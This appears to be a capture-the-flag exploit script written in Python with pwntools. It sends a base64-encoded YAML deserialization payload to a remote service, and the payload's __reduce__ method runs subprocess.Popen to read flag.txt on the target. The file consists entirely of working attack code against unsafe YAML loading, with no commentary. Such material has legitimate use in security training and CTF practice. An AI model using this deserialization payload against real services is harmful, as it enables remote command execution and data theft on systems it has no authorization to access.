from pwn import *
from base64 import b64encode, b64decode

io = remote(sys.argv[1], sys.argv[2])
context.log_level = 'debug'
def send_config(config):
    io.sendlineafter(">", "2")
    io.sendlineafter(":", config)

import yaml
from yaml import UnsafeLoader, FullLoader, Loader

class Payload(object):
    def __reduce__(self):
        return (subprocess.Popen,(['cat', 'flag.txt'],))

payload = yaml.dump(Payload())
send_config(b64encode(payload.encode()).decode())
io.interactive()